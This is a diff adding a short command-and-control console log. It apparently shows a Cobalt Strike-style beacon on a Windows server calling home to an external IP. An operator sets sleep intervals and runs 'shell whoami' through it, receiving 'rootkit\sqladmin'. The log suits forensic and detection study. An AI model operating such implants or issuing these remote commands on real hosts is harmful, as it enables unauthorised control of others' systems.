@@ -1,0 +1,25 @@
+11/20 06:07:23 UTC [metadata] 106.38.94.146 <- 192.168.3.73; computer: SRV-WEB-KIT; user: sqladmin; process: beacon_x64.exe; pid: 2084; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+11/20 06:07:15 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+11/20 06:07:15 UTC [note] Bid: 1556377212  NT: 6.2
+11/20 06:07:15 UTC [task] <T1029> Tasked beacon to become interactive
+11/20 06:07:15 UTC [task] <T1029> Tasked beacon to sleep for 10s (30% jitter)
+11/20 06:07:15 UTC [note]   Ver: 6.2
+11/20 06:07:25 UTC [input] <admin1> sleep 0
+11/20 06:07:25 UTC [task] <T1029> Tasked beacon to become interactive
+11/20 06:08:14 UTC [checkin] host called home, sent: 64 bytes
+11/20 06:08:40 UTC [input] <admin1> shell whoami
+11/20 06:08:40 UTC [task] <T1059> Tasked beacon to run: whoami
+11/20 06:08:43 UTC [checkin] host called home, sent: 37 bytes
+11/20 06:08:58 UTC [input] <admin1> shell whoami
+11/20 06:08:59 UTC [task] <T1059> Tasked beacon to run: whoami
+11/20 06:09:04 UTC [output]
+received output:
+rootkit\sqladmin
+
+
+11/20 06:09:04 UTC [checkin] host called home, sent: 37 bytes
+11/20 06:09:04 UTC [output]
+received output:
+rootkit\sqladmin
+
+
